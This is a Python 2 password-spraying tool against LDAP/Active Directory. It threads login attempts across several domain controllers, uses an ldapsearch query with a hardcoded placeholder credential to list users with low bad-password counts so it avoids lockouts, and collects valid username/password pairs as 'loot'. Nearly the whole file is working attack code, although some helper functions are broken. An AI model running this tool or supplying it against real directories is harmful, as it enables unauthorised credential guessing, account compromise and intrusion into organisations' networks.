#!/usr/bin/python
import argparse
import threading
import ldap
import sys
from time import sleep
import time
from getpass import getpass
from subprocess import PIPE, Popen
 
loot = {}
ldap_qcount = {}

class userThread(threading.Thread):
	def __init__(self, user, password='', domain='', ldap_server_obj=None, ldap_server_name=''):
		threading.Thread.__init__(self)
		self.username = user
		self.password = password
		self.domain = domain
		self.ldap_server = ldap_server_obj
		self.ldap_server_name = ldap_server_name

	def run(self):
		while True:
			# Connect to ldap server and test creds.
			if self.username and self.password and self.ldap_server:
				try:
				    #self.ldap_server.protocol_version = ldap.VERSION3
				    #self.ldap_server.set_option(ldap.OPT_REFERRALS,0)
					self.ldap_server.simple_bind_s("%s@%s" % (self.username, self.domain), self.password)
					#print("Valid Credential: %s=%s" % (self.username, self.password))
					# I don't expect to have dups,
					# but using a list anyway.
					if loot.has_key(self.username):
						loot[self.username].append((self.username, self.password))
					else:
						loot[self.username] = [(self.username, self.password)]
					break

				except(ldap.INVALID_CREDENTIALS):
				    break
				except(ldap.SERVER_DOWN):
					print("Can't contact LDAP server.")
					break
				except(ldap.BUSY):
					#print("busy..")
					sleep(3)
				except Exception, error:
				    print error
				    break
		return None

def ldap_search(filter=""):
	cmd = 'ldapsearch -h x.x.x.x -b dc=example,dc=local -x "(&(objectClass=user)(samaccountname=*)(badpwdcount<=1))" -D user_200@example.local -w password123!  -E pr=500000/noprompt "samaccountname" | egrep -io "samaccountname: .+" | cut -d " " -f2 '
	raw_output = runBash(cmd)
	s = set()
	for user in raw_output:
		user = user.strip()
		if user.strip() not in ["Guest", "krbtgt", "Administrator"] and not user.endswith("$"):
			s.add(user)
	return s

def runBash(cmd):
	p = Popen(cmd, shell=True, stdout=PIPE)
	r = p.stdout.readlines()
	return r

def get_users(opts):
	ldap_server = input("LDAP Server: ")
	ldap_domain = input("LDAP Domain: ")
	username = input("LDAP Username: ")
	password = input("LDAP '%s' Password: " % username)
	ldap.initialize('ldap://%s:3268' % ldap_server)
	ldap_server.simple_bind_s("%s@%s" % (username, domain), password)
		
def print_loot():
	if loot:
		print("\n%s Loot Found! %s" % ("*"*5, "*"*5))
		for user,creds in sorted(loot.iteritems()):
			for cred in creds:
				print("%s:%s" % cred)
	else:
		print("no loot.")

def setup_ldap(ldap_list):
	d = {}
	for ldap_server in ldap_list:
		# Doesn't error on initialization, 
		# but will during bind if non-existent/unreachable server.
		d[ldap_server] = ldap.initialize('ldap://%s:3268' % ldap_server)
	return d

def pull_list(file_path):
	# Return unique whitespace trimmed list.
	items = set()
	item = None
	if file_path:
		f = open(file_path, "r")
		while item != "":
			item = f.readline().strip()
			items.add(item)
		f.close()
		items.discard("")
		return items
	else:
		return []
		
def process_args():
	parser = argparse.ArgumentParser(description='Enumerate common/shitty passwords by pw spraying against LDAP/AD.')
	parser.add_argument('-u','--users', metavar="<user_list>", type=str, help='File path to user list.')
	parser.add_argument('-p','--passwords', metavar="<pw_list>", type=str, help='File path to password list to use.')
	parser.add_argument('-s','--ldap_servers', metavar="<ldap_servers>", type=str, help='Quoted common seperated list of ldap servers.')
	parser.add_argument('-d','--domain', metavar="<domain>", type=str, help='Domain "example.com"')
	return parser.parse_args()

def check_poll_list(pl, ldap_qcount):
	tmp_poll_list = []
	for thread in pl:
		if thread.is_alive():
			tmp_poll_list.append(thread)
		else:
			ldap_qcount[thread.ldap_server_name] -= 1
	pl = tmp_poll_list

	return pl, ldap_qcount

def main():

	# Process args
	opts = process_args()

	# Grab users
	users_list = pull_list(opts.users)
	pw_list = pull_list(opts.passwords)
	if opts.ldap_servers:
		ldap_qcount = dict.fromkeys([lserver.strip() for lserver in opts.ldap_servers.split(",") if lserver], 0)
	else:
		print("No LDAP server specified. Exiting.")
		sys.exit()

	domain = opts.domain

	# Setup LDAP connections/objects
	ldap_servers = setup_ldap(ldap_qcount.keys())

	max_queue_size = len(ldap_qcount.keys()) * 450
	# Arbitrary 80% min queue value.
	min_queue_size = int(max_queue_size * .80)
	queue_pause_time = 1

	# Main user/pw loop and polling queue.
	poll_list = []
	tick = time.time()
	print("Searching for loot.")
	for password in pw_list:
		for user in users_list:
			if len(poll_list) < max_queue_size:
				ldap_tribute = min(ldap_qcount, key=ldap_qcount.get)
				ldap_qcount[ldap_tribute] += 1
				poll_list.append(userThread(user, password, domain, ldap_servers[ldap_tribute], ldap_tribute))
				poll_list[-1].start()
				poll_list, ldap_qcount = check_poll_list(poll_list, ldap_qcount)
			else:
				# Churn through poll_list queue until
				# lower 'min_queue_size' threshold is met.
				while len(poll_list) >= min_queue_size:
					poll_list, ldap_qcount = check_poll_list(poll_list, ldap_qcount)
					sleep(queue_pause_time)

	tock2 = 0
	tick2 = time.time()
	print("Finished checking list. Waiting for queue to empty.")
	while len(poll_list) > 0 and (tock2 - tick2) < 30:
		print("%s items in the queue." % len(poll_list))
		poll_list, ldap_qcount = check_poll_list(poll_list, ldap_qcount)
		sleep(queue_pause_time)
		tock2 = time.time()
	tock = time.time()
	print("Total duration: %s in seconds" % (tock - tick))

	print print_loot()

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()


